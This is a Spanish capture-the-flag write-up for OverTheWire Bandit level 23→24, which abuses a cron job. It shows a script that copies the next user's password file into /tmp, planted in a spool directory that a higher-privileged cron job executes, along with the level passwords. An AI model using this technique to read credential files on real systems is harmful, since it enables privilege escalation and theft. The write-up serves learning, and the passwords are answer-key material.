
# Level 23 a 24

## Objetivo
```
	A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
```



## Datos de acceso
	Usuario: bandit23
	contraseña: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
## Solución
	
``` Shell 
bandit23@bandit:~$
bandit23@bandit:~$ mkdir /tmp/aneka
bandit23@bandit:~$ cd /tmp/aneka
bandit23@bandit:/tmp/aneka$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/aneka/password" > aneka.sh
bandit23@bandit:/tmp/aneka$ cat aneka.sh
cat /etc/bandit_pass/bandit24 >> /tmp/aneka/password
bandit23@bandit:/tmp/aneka$ chmod 777 aneka.sh
bandit23@bandit:/tmp/aneka$ touch password
bandit23@bandit:/tmp/aneka$ chmod 666 password
bandit23@bandit:/tmp/aneka$ ls -la
total 192
drwxrwxr-x    2 bandit23 bandit23   4096 Sep  6 13:32 .
drwxrwx-wt 4821 root     root     184320 Sep  6 13:31 ..
-rwxrwxrwx    1 bandit23 bandit23     53 Sep  6 13:31 aneka.sh
-rw-rw-rw-    1 bandit23 bandit23      0 Sep  6 13:32 password
bandit23@bandit:/tmp/aneka$ cp aneka.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/aneka$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/aneka$
```

## Notas adicionales
```
 Creamos un script
 damos permisos
 leemos el script
```
## Referencias 